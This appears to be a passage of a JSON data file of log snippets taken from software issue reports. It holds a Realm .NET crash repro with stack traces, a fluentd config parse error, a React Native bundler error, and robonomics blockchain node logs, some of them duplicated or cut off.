ftr_dfs.append(ftr_df)\r\n    ftr_df = pd.concat(ftr_dfs)\r\n\r\n    x_pred = ftr_df.drop(labels=['labels', 'foreign_key'], axis=\"columns\").values\r\n    y_pred = clf.predict(x_pred)\r\n    split_inds = np.nonzero(np.diff(ftr_df.foreign_key.values))[0]\r\n    y_pred_list = np.split(y_pred, split_inds)\r\n    y_pred_list = [\r\n        ''.join([inverse_labelmap[el] for el in y_pred]) + \"\\n\"\r\n        for y_pred in y_pred_list\r\n    ]\r\n\r\n    pred_path = predict_dst / (extract_csv_path.stem + f'.pred.txt')\r\n    with pred_path.open('w') as fp:\r\n        fp.writelines(y_pred_list)\r\n\r\n    return pred_path\r\n\r\n"
    },
    {
        "logs": "`\r\n        public class Tst1 : RealmObject\r\n        {\r\n            [PrimaryKey]\r\n            public string Id { get; set; }\r\n        }\r\n        private void Form1_Load(object sender, EventArgs e)\r\n        {\r\n            var config = new RealmConfiguration(Path.GetTempFileName())\r\n            {\r\n            };\r\n            var realm = Realm.GetInstance(config);\r\n            realm.All<Tst1>().SubscribeForNotifications(Changed);\r\n\r\n            var r = Realm.GetInstance(config);\r\n            var tst1 = new Tst1()\r\n            {\r\n                Id = \"1\"\r\n            };\r\n            r.Write(() =>\r\n            {\r\n                r.Add(tst1);\r\n            });\r\n            realm.Refresh();\r\n\r\n            r.Write(() =>\r\n            {\r\n                r.Remove(tst1);\r\n            });\r\n            realm.Refresh();\r\n        }\r\n\r\n\r\n        private void Changed(IRealmCollection<Tst1> sender, ChangeSet changes, Exception error)\r\n        {\r\n            if (changes == null)\r\n                return;\r\n\r\n            foreach (int changesDeletedIndex in changes.DeletedIndices)\r\n            {\r\n                var z = sender[changesDeletedIndex];\r\n                Console.WriteLine(z.Id); //here goes the AccessViolationException\r\n            }\r\n        }\r\n"
    },
    {
        "logs": "`\r\n   at Realms.ObjectHandle.NativeMethods.get_string(ObjectHandle handle, IntPtr propertyIndex, IntPtr buffer, IntPtr bufsize, Boolean& isNull, NativeException& ex)\r\n   at Realms.ObjectHandle.<>c__DisplayClass13_0.<GetString>b__0(IntPtr buffer, IntPtr length, Boolean& isNull, NativeException& ex) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\ObjectHandle.cs:line 284\r\n   at Realms.MarshalHelpers.GetString(NativeStringGetter getter) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\MarshalHelpers.cs:line 116\r\n   at Realms.ObjectHandle.GetString(IntPtr propertyIndex) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\ObjectHandle.cs:line 284\r\n   at Realms.RealmObject.GetStringValue(String propertyName) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\RealmObject.cs:line 153\r\n   at RealmWin.Form1.Tst1.get_Id() in C:\\DiskD\\Projects\\RealmWin\\RealmWin\\Form1.cs:line 25\r\n   at RealmWin.Form1.Changed(IRealmCollection"
    },
    {
        "logs": "`1 exception) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\RealmCollectionBase.cs:line 319\r\n   at Realms.RealmCollectionNativeHelper.NotificationCallbackImpl(IntPtr managedResultsHandle, IntPtr changes, IntPtr exception) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Linq\\RealmCollectionNativeHelper.cs:line 38\r\n   at Realms.SharedRealmHandle.NativeMethods.refresh(SharedRealmHandle sharedRealm, NativeException& ex)\r\n   at Realms.SharedRealmHandle.Refresh() in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\SharedRealmHandle.cs:line 184\r\n   at Realms.Realm.Refresh() in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Realm.cs:line 762\r\n   at RealmWin.Form1.Form1_Load(Object sender, EventArgs e) in C:\\DiskD\\Projects\\RealmWin\\RealmWin\\Form1.cs:line 56\r\n   at System.Windows.Forms.Form.OnLoad(EventArgs e)\r\n   at System.Windows.Forms.Form.OnCreateControl()\r\n   at System.Windows.Forms.Control.CreateControl(Boolean fIgnoreVisible)\r\n   at System.Windows.Forms.Control.CreateControl()\r\n   at System.Windows.Forms.Control.WmShowWindow(Message& m)\r\n   at System.Windows.Forms.Control.WndProc(Message& m)\r\n   at System.Windows.Forms.ScrollableControl.WndProc(Message& m)\r\n   at System.Windows.Forms.Form.WmShowWindow(Message& m)\r\n   at System.Windows.Forms.Form.WndProc(Message& m)\r\n   at System.Windows.Forms.Control.ControlNativeWindow.OnMessage(Message& m)\r\n   at System.Windows.Forms.Control.ControlNativeWindow.WndProc(Message& m)\r\n   at System.Windows.Forms.NativeWindow.DebuggableCallback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam)\r\n"
    },
    {
        "logs": "```\r\n        public class Tst1 : RealmObject\r\n        {\r\n            [PrimaryKey]\r\n            public string Id { get; set; }\r\n        }\r\n        private void Form1_Load(object sender, EventArgs e)\r\n        {\r\n            var config = new RealmConfiguration(Path.GetTempFileName())\r\n            {\r\n            };\r\n            var realm = Realm.GetInstance(config);\r\n            realm.All<Tst1>().SubscribeForNotifications(Changed);\r\n\r\n            var r = Realm.GetInstance(config);\r\n            var tst1 = new Tst1()\r\n            {\r\n                Id = \"1\"\r\n            };\r\n            r.Write(() =>\r\n            {\r\n                r.Add(tst1);\r\n            });\r\n            realm.Refresh();\r\n\r\n            r.Write(() =>\r\n            {\r\n                r.Remove(tst1);\r\n            });\r\n            realm.Refresh();\r\n        }\r\n\r\n\r\n        private void Changed(IRealmCollection<Tst1> sender, ChangeSet changes, Exception error)\r\n        {\r\n            if (changes == null)\r\n                return;\r\n\r\n            foreach (int changesDeletedIndex in changes.DeletedIndices)\r\n            {\r\n                var z = sender[changesDeletedIndex];\r\n                Console.WriteLine(z.Id); //here goes the AccessViolationException\r\n            }\r\n        }\r\n"
    },
    {
        "logs": "```\r\n   at Realms.ObjectHandle.NativeMethods.get_string(ObjectHandle handle, IntPtr propertyIndex, IntPtr buffer, IntPtr bufsize, Boolean& isNull, NativeException& ex)\r\n   at Realms.ObjectHandle.<>c__DisplayClass13_0.<GetString>b__0(IntPtr buffer, IntPtr length, Boolean& isNull, NativeException& ex) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\ObjectHandle.cs:line 284\r\n   at Realms.MarshalHelpers.GetString(NativeStringGetter getter) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\MarshalHelpers.cs:line 116\r\n   at Realms.ObjectHandle.GetString(IntPtr propertyIndex) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\ObjectHandle.cs:line 284\r\n   at Realms.RealmObject.GetStringValue(String propertyName) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\RealmObject.cs:line 153\r\n   at RealmWin.Form1.Tst1.get_Id() in C:\\DiskD\\Projects\\RealmWin\\RealmWin\\Form1.cs:line 25\r\n   at RealmWin.Form1.Changed(IRealmCollection`1 sender, ChangeSet changes, Exception error) in C:\\DiskD\\Projects\\RealmWin\\RealmWin\\Form1.cs:line 68\r\n   at Realms.RealmCollectionBase`1.Realms.RealmCollectionNativeHelper.Interface.NotifyCallbacks(Nullable`1 changes, Nullable`1 exception) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\RealmCollectionBase.cs:line 319\r\n   at Realms.RealmCollectionNativeHelper.NotificationCallbackImpl(IntPtr managedResultsHandle, IntPtr changes, IntPtr exception) in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Linq\\RealmCollectionNativeHelper.cs:line 38\r\n   at Realms.SharedRealmHandle.NativeMethods.refresh(SharedRealmHandle sharedRealm, NativeException& ex)\r\n   at Realms.SharedRealmHandle.Refresh() in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Handles\\SharedRealmHandle.cs:line 184\r\n   at Realms.Realm.Refresh() in C:\\jenkins\\workspace\\_realm-dotnet_release_1.1.1-S7NL3AZZ3PXAXXTBAUXPTN4JUF4H2MQM3SW4U2P73STDAAHWRYIA\\Shared\\Realm.Shared\\Realm.cs:line 762\r\n   at RealmWin.Form1.Form1_Load(Object sender, EventArgs e) in C:\\DiskD\\Projects\\RealmWin\\RealmWin\\Form1.cs:line 56\r\n   at System.Windows.Forms.Form.OnLoad(EventArgs e)\r\n   at System.Windows.Forms.Form.OnCreateControl()\r\n   at System.Windows.Forms.Control.CreateControl(Boolean fIgnoreVisible)\r\n   at System.Windows.Forms.Control.CreateControl()\r\n   at System.Windows.Forms.Control.WmShowWindow(Message& m)\r\n   at System.Windows.Forms.Control.WndProc(Message& m)\r\n   at System.Windows.Forms.ScrollableControl.WndProc(Message& m)\r\n   at System.Windows.Forms.Form.WmShowWindow(Message& m)\r\n   at System.Windows.Forms.Form.WndProc(Message& m)\r\n   at System.Windows.Forms.Control.ControlNativeWindow.OnMessage(Message& m)\r\n   at System.Windows.Forms.Control.ControlNativeWindow.WndProc(Message& m)\r\n   at System.Windows.Forms.NativeWindow.DebuggableCallback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam)\r\n"
    },
    {
        "logs": "`\r\nWhat is the right way to use  delitimer o ASCII table?<issue_closed>\n<issue_comment>username_1: https://groups.google.com/forum/#!forum/fluentd\r\n\r\nI think "
    },
    {
        "logs": "```\r\nJun 18 09:16:29 fluentd1 fluentd[5467]: /opt/td-agent/embedded/lib/ruby/gems/2.4.0/gems/fluentd-1.3.3/lib/fluent/config/basic_parser.rb:92:in `parse_error!': unexpected back-slash escape character 'x' at main.conf line 83,24 (Fluent::ConfigParseError)\r\nJun 18 09:16:29 fluentd1 fluentd[5467]:  82:            @type csv\r\nJun 18 09:16:29 fluentd1 fluentd[5467]:  83:            delimiter \"\\x31\"\r\nJun 18 09:16:29 fluentd1 fluentd[5467]:      ------------------------^\r\n\r\n\r\n"
    },
    {
        "logs": "`The development server returned response error code: 500\r\n\r\nURL: http://10.0.2.2:8081/index.delta?platform=android&dev=true&minify=false\r\n\r\nBody:\r\n{\"originModulePath\":\"/Users/admin/Desktop/rn59/node_modules/istanbul-reports/index.js\",\"targetModuleName\":\"path\",\"message\":\"Unable to resolve module "
    },
    {
        "logs": "` does not exist in the Haste module map\\n\\nThis might be related to https://github.com/facebook/react-native/issues/4968\\nTo resolve try the following:\\n  1. Clear watchman watches: "
    },
    {
        "logs": "` does not exist in the Haste module map\\n\\nThis might be related to https://github.com/facebook/react-native/issues/4968\\nTo resolve try the following:\\n  1. Clear watchman watches: "
    },
    {
        "logs": "`\r\n-> % systemctl status robonomics_testNet.service \r\n\u25cf robonomics_testNet.service - robonomics service\r\n   Loaded: loaded (/etc/systemd/system/robonomics_testNet.service; enabled; vendor preset: enabled)\r\n   Active: active (running) since Sun 2020-09-27 13:50:16 UTC; 1 day 7h ago\r\n Main PID: 730 (robonomics)\r\n    Tasks: 47 (limit: 1151)\r\n   CGroup: /system.slice/robonomics_testNet.service\r\n           \u2514\u2500730 /usr/bin/robonomics --chain parachain --name ijn15 | 0x283B4163bA8c0E18b75713674e11e25FA1AD83f8\r\n\r\nSep 28 21:02:58 ubuntu15 robonomics[730]: 2020-09-28 21:02:58 \ud83d\udca4 [Relaychain] Idle (6 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 14.1kiB/s \u2b06 5.2kiB/s\r\nSep 28 21:03:01 ubuntu15 robonomics[730]: 2020-09-28 21:03:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWAF\r\nSep 28 21:03:01 ubuntu15 robonomics[730]: 2020-09-28 21:03:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWB8\r\nSep 28 21:03:02 ubuntu15 robonomics[730]: 2020-09-28 21:03:02 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.7kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:03:03 ubuntu15 robonomics[730]: 2020-09-28 21:03:03 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWPP\r\nSep 28 21:03:03 ubuntu15 robonomics[730]: 2020-09-28 21:03:03 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775773 (8 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 35.3ki\r\nSep 28 21:03:04 ubuntu15 robonomics[730]: 2020-09-28 21:03:04 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWJc\r\nSep 28 21:03:05 ubuntu15 robonomics[730]: 2020-09-28 21:03:05 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWG1\r\nSep 28 21:03:07 ubuntu15 robonomics[730]: 2020-09-28 21:03:07 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.3kiB/s \u2b06 4.3kiB/s\r\n"
    },
    {
        "logs": "`\r\nSep 28 21:09:36 ubuntu15 robonomics[730]: 2020-09-28 21:09:36 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWAFH1GqtxWvaxxwkunPH4frZMV2qDQKbV8i21AYkWY5UU, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:38 ubuntu15 robonomics[730]: 2020-09-28 21:09:38 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.7kiB/s \u2b06 3.7kiB/s\r\nSep 28 21:09:39 ubuntu15 robonomics[730]: 2020-09-28 21:09:39 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWL3ycav71QcaKCvU8FmpozpwnEzGhpjGnCuBXZkZJEHLF, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:39 ubuntu15 robonomics[730]: 2020-09-28 21:09:39 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775794 (8 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 24.2kiB/s \u2b06 7.4kiB/s\r\nSep 28 21:09:41 ubuntu15 robonomics[730]: 2020-09-28 21:09:41 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWG18SW2KouBaSrCenxUKotmLPqag3WMJmunFLaJHpEXTs, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:43 ubuntu15 robonomics[730]: 2020-09-28 21:09:43 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.1kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:09:43 ubuntu15 robonomics[730]: 2020-09-28 21:09:43 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWLMwUNrt2RNKjJqcPmDUh9ucLyZ7h1nGcQ9Ww2ZLMFABW, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:44 ubuntu15 robonomics[730]: 2020-09-28 21:09:44 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWPmFKA2NC2KNckiA3T29cxRQMVwEHAexqaeNTjyDV7PsQ, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:44 ubuntu15 robonomics[730]: 2020-09-28 21:09:44 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 34.3kiB/s \u2b06 8.3kiB/s\r\nSep 28 21:09:48 ubuntu15 robonomics[730]: 2020-09-28 21:09:48 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.8kiB/s \u2b06 4.0kiB/s\r\nSep 28 21:09:49 ubuntu15 robonomics[730]: 2020-09-28 21:09:49 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 3.2kiB/s \u2b06 3.2kiB/s\r\nSep 28 21:09:53 ubuntu15 robonomics[730]: 2020-09-28 21:09:53 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.8kiB/s \u2b06 4.6kiB/s\r\nSep 28 21:09:54 ubuntu15 robonomics[730]: 2020-09-28 21:09:54 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 3.4kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:09:58 ubuntu15 robonomics[730]: 2020-09-28 21:09:58 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.0kiB/s \u2b06 4.1kiB/s\r\nSep 28 21:09:59 ubuntu15 robonomics[730]: 2020-09-28 21:09:59 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWSPayd1AVbkQnoKNY31ct7REiME9F7Bi1Sy4ByZMKghZT, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:59 ubuntu15 robonomics[730]: 2020-09-28 21:09:59 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 15.0kiB/s \u2b06 6.2kiB/s\r\nSep 28 21:10:00 ubuntu15 robonomics[730]: 2020-09-28 21:10:00 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWBBwauXVbCC3TvGvynyi58AwRZSGGLx7KBoKFfcfEbhHD, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:10:01 ubuntu15 robonomics[730]: 2020-09-28 21:10:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWGqrUyhEt4yPPSbGxosjLjdYWjkgJkusM135Tvm1a35AF, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\n"
    },
    {
        "logs": "```\r\n-> % systemctl status robonomics_testNet.service \r\n\u25cf robonomics_testNet.service - robonomics service\r\n   Loaded: loaded (/etc/systemd/system/robonomics_testNet.service; enabled; vendor preset: enabled)\r\n   Active: active (running) since Sun 2020-09-27 13:50:16 UTC; 1 day 7h ago\r\n Main PID: 730 (robonomics)\r\n    Tasks: 47 (limit: 1151)\r\n   CGroup: /system.slice/robonomics_testNet.service\r\n           \u2514\u2500730 /usr/bin/robonomics --chain parachain --name ijn15 | 0x283B4163bA8c0E18b75713674e11e25FA1AD83f8\r\n\r\nSep 28 21:02:58 ubuntu15 robonomics[730]: 2020-09-28 21:02:58 \ud83d\udca4 [Relaychain] Idle (6 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 14.1kiB/s \u2b06 5.2kiB/s\r\nSep 28 21:03:01 ubuntu15 robonomics[730]: 2020-09-28 21:03:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWAF\r\nSep 28 21:03:01 ubuntu15 robonomics[730]: 2020-09-28 21:03:01 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWB8\r\nSep 28 21:03:02 ubuntu15 robonomics[730]: 2020-09-28 21:03:02 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.7kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:03:03 ubuntu15 robonomics[730]: 2020-09-28 21:03:03 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWPP\r\nSep 28 21:03:03 ubuntu15 robonomics[730]: 2020-09-28 21:03:03 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775773 (8 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 35.3ki\r\nSep 28 21:03:04 ubuntu15 robonomics[730]: 2020-09-28 21:03:04 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWJc\r\nSep 28 21:03:05 ubuntu15 robonomics[730]: 2020-09-28 21:03:05 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWG1\r\nSep 28 21:03:07 ubuntu15 robonomics[730]: 2020-09-28 21:03:07 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.3kiB/s \u2b06 4.3kiB/s\r\n"
    },
    {
        "logs": "```\r\nSep 28 21:09:36 ubuntu15 robonomics[730]: 2020-09-28 21:09:36 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWAFH1GqtxWvaxxwkunPH4frZMV2qDQKbV8i21AYkWY5UU, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:38 ubuntu15 robonomics[730]: 2020-09-28 21:09:38 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.7kiB/s \u2b06 3.7kiB/s\r\nSep 28 21:09:39 ubuntu15 robonomics[730]: 2020-09-28 21:09:39 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWL3ycav71QcaKCvU8FmpozpwnEzGhpjGnCuBXZkZJEHLF, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:39 ubuntu15 robonomics[730]: 2020-09-28 21:09:39 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775794 (8 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 24.2kiB/s \u2b06 7.4kiB/s\r\nSep 28 21:09:41 ubuntu15 robonomics[730]: 2020-09-28 21:09:41 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWG18SW2KouBaSrCenxUKotmLPqag3WMJmunFLaJHpEXTs, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:43 ubuntu15 robonomics[730]: 2020-09-28 21:09:43 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.1kiB/s \u2b06 3.8kiB/s\r\nSep 28 21:09:43 ubuntu15 robonomics[730]: 2020-09-28 21:09:43 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWLMwUNrt2RNKjJqcPmDUh9ucLyZ7h1nGcQ9Ww2ZLMFABW, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:44 ubuntu15 robonomics[730]: 2020-09-28 21:09:44 \ud83d\udc94 Verification failed for block 0x890895bb71874f5b9bb96aef5b0caaf1dd34c81255cd3dd2754a1a5aaadc6ef3 received from peer: 12D3KooWPmFKA2NC2KNckiA3T29cxRQMVwEHAexqaeNTjyDV7PsQ, \"UnknownBlock: State already discarded for BlockId::Hash(0x59cc7c73337ff878c536a307e6c1283ba9c658f49bdd1134ad75092cbf1de12b)\"\r\nSep 28 21:09:44 ubuntu15 robonomics[730]: 2020-09-28 21:09:44 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 34.3kiB/s \u2b06 8.3kiB/s\r\nSep 28 21:09:48 ubuntu15 robonomics[730]: 2020-09-28 21:09:48 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 3.8kiB/s \u2b06 4.0kiB/s\r\nSep 28 21:09:49 ubuntu15 robonomics[730]: 2020-09-28 21:09:49 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 3.2kiB/s \u2b06 3.2kiB/s\r\nSep 28 21:09:53 ubuntu15 robonomics[730]: 2020-09-28 21:09:53 \ud83d\udca4 [Parachain] Idle (49 peers), best: #47529 (0x547c\u202665a6), finalized #47492 (0x05d7\u2026ebd7), \u2b07 4.8kiB/s \u2b06 4.6kiB/s\r\nSep 28 21:09:54 ubuntu15 robonomics[730]: 2020-09-28 21:09:54 \u2699\ufe0f  [Relaychain] Syncing  0.0 bps, target=#775305 (7 peers), best: #768955 (0x59cc\u2026e12b), finalized #760389 (0x35fd\u202654c2), \u2b07 3.4kiB/s \u2b06 3.8kiB/s\r\nSep 28 